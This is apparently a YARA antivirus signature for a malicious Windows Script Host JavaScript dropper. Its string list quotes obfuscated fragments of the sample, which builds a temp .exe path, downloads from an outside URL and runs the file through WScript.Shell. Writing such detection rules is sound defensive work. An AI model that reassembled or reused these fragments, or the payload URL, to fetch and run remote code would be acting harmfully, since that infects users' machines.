rule sig_20160328_384de36ab4b5fadba916918c4cbe73ef {
  meta:
    description = "datamaliciousorder - file 20160328_384de36ab4b5fadba916918c4cbe73ef.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "29699c46802b7ea2facc5fc018717910bcf267a4f4f883e8e1483b5dc22fa8d6"

  strings:
    $s1  = "function Xoosbyfbdg() {return Aglahugui[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"4wfAjraVa1p.exe\";};" fullword ascii
    $s2  = "Rzexy[Ijbft](\"GET\", \"http://blackmountaintipis.com/mxn3aad\", false);" fullword ascii
    $s3  = "do {WScript[Dgakgrpgh](Lvdnlwk() * 11)} while (Rzexy[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Valbebfb(Gldatfesf, Kevss){return Gldatfesf - Kevss;};" fullword ascii
    $s5  = "var Aglahugui = function Kqhlxo() {return WScript[Njlcxsekvt](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Zrpqftj(Kcgvstypt){Aglahugui[\"Run\"](Kcgvstypt, Legvkiflk, Legvkiflk);};" fullword ascii
    $s7  = "var Krunuyfuc = false;" fullword ascii
    $s8  = " while (Cxyat){" fullword ascii
    $s9  = "function Zvqpka(){return Njlcxsekvt;};" fullword ascii
    $s10 = "return Valbebfb(Gyujhrwb, Whmfgz);" fullword ascii
    $s11 = "var Ecbjipq = new this[\"Date\"]();" fullword ascii
    $s12 = "function Qipjhufho(Yonkn) {var Knyun = (1, 2, 3, 4, 5, Yonkn); return Knyun;};" fullword ascii
    $s13 = "var Eohsmhoyx = false;" fullword ascii
    $s14 = "function Rifwo()" fullword ascii
    $s15 = "function Lvdnlwk(){return 22;};" fullword ascii
    $s16 = "Eohsmhoyx = true; " fullword ascii
    $s17 = "function Tcoxcguw(){return Cdjoc;};" fullword ascii
    $s18 = "function Lmyfdcu() {return ((Eohsmhoyx == true) && (Eohsmhoyx == Jpcaecdvqr)) ? 1 : Legvkiflk;};" fullword ascii
    $s19 = "    Krunuyfuc = true;" fullword ascii
    $s20 = "Jpcaecdvqr = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}